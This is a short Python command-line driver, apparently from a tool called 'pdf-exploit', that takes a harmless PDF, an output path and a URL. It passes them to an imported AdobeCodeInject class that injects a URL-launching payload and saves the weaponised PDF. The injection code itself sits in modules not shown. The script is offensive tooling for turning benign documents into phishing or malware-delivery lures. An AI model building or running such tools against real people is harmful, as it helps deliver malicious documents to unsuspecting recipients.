#! ./.venv/bin/python3

import argparse
import sys
import os

sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from core import Pdf
from adobecodeinject import AdobeCodeInject

def run():
    parser = argparse.ArgumentParser(prog='pdf-exploit')

    parser.add_argument("-f", help="the harmless pdf path", required=True)
    parser.add_argument("-o", help="the new pdf file", required=True)
    parser.add_argument("-url", help="URL to launch", required=True)

    args = parser.parse_args()

    pdf = Pdf(args.f)  # Burada args.p yerine args.f kullanılıyor

    if args.url:
        print(f"[+] use the adobe PDF exploit: {args.url}")
        exp = AdobeCodeInject(args.url)
        exp.exploit(pdf)
        print("")

    print(f"[+] store to {args.o}")
    pdf.store(args.o)

if __name__ == "__main__":
    run()
